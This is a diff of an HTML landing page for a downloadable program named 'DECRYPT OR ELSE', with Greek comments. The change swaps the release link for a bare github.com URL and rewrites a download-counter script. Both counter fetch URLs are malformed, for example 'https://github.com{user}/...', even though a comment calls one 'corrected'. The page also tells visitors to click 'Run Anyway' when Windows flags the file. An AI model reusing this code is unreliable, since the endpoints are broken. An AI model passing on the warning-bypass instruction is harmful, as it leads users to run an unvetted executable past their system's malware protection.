@@ -109,11 +109,11 @@
         <div style="font-size: 1.5rem; font-weight: 300;">DECRYPT OR ELSE</div>
         
         <div class="dl-badge">
-            <span id="dl-count">0</span> DOWNLOADS
+            <span id="dl-count">...</span> DOWNLOADS
         </div>
 
         <!-- ΤΟ ΔΙΚΟ ΣΟΥ DIRECT DOWNLOAD LINK -->
-        <a href="https://github.com/mikrousikos12/doe/releases/download/alpha_ver/D.O.E.V0.1.Github.zip" class="btn-download">GET LATEST VERSION</a>
+        <a href="https://github.com" class="btn-download">GET LATEST VERSION</a>
         
         <div class="defender-notice">
             Note: If Windows flags the file, click "More Info" -> "Run Anyway". 
@@ -168,24 +168,24 @@
             const user = "mikrousikos12"; 
             const repo = "doe";     
             try {
-                // Corrected API endpoint for GitHub
-                const res = await fetch(`https://github.com{user}/${repo}/releases`);
+                // Χρήση Shields.io API για πιο σταθερά αποτελέσματα
+                const res = await fetch(`https://shields.io{user}/${repo}/total.json`);
                 const data = await res.json();
-                let total = 0;
                 
-                if (data && Array.isArray(data)) {
-                    data.forEach(release => {
-                        if(release.assets) {
-                            release.assets.forEach(asset => total += asset.download_count);
-                        }
-                    });
+                if (data && data.value) {
+                    // Καθαρισμός του κειμένου για να μείνει μόνο ο αριθμός
+                    const count = data.value.replace('downloads', '').trim();
+                    document.getElementById('dl-count').innerText = count;
+                } else {
+                    document.getElementById('dl-count').innerText = "0";
                 }
-                document.getElementById('dl-count').innerText = total.toLocaleString();
             } catch (e) {
                 console.error("Error fetching downloads:", e);
-                document.getElementById('dl-count').innerText = "0";
+                document.getElementById('dl-count').innerText = "ERR";
             }
         }
+        
+        // Εκτέλεση κατά το άνοιγμα της σελίδας
         fetchDownloads();
     </script>
 </body>
